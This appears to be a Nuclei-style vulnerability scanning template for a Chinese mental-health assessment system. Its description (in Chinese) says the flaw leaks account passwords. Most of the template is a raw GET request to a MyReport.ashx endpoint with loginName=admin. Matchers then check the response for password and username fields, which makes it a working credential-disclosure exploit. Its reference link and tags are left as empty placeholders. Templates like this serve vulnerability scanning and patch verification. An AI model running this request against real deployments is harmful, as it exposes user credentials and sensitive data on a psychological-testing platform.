id: jinshi-MyReport-weak
info:
  name: jinshi-MyReport-weak
  author: apple
  severity: high
  description: 京师心智心理健康测评系统-账号密码泄露,攻击者可通过此漏洞获取敏感信息，从而为下一步攻击做准备。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |+
        GET /FunctionModular/PersonalReport/Ajax/MyReport.ashx?type=3&loginName=admin HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: ASP.NET_SessionId=b4xjtmhwo1tpl5zzidv5rcgg
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - _u_password
      - type: word
        part: body
        words:
          - _u_name
